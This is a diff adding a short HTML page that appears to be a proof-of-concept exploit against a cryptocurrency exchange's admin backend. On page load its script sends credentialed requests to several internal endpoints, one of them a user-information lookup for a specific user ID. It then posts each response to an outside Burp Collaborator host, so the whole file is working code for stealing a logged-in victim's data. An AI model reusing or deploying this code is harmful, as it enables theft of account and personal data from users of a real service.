@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>.</title>
+</head>
+<body>
+    <script>
+        // Function to log response data to Burp Collaborator
+        function logResponse(response) {
+            fetch('https://8r0150yoonqzfx1b1j54dmrbf2lt9q5eu.oastify.com/log?key=' + encodeURIComponent(response));
+        }
+
+        // Function to fetch and log data from a URL
+        function fetchData(url) {
+            var xhr = new XMLHttpRequest();
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    logResponse(xhr.responseText);
+                }
+            };
+            xhr.open('GET', url, true);
+            xhr.withCredentials = true;
+            xhr.send();
+        }
+
+        // Fetch data from Target URL 1
+        fetchData('https://csboss.okex.org/newboss/home');
+
+        // Fetch data from Target URL 2
+        fetchData('https://csboss.okex.org/newboss/okboss/user/userInformationAll?userId=46334716');
+
+        // Fetch data from Target URL 3
+        fetchData('https://csboss.okex.org/newboss/okboss/user/userInformationAll');
+    </script>
+</body>
+</html>
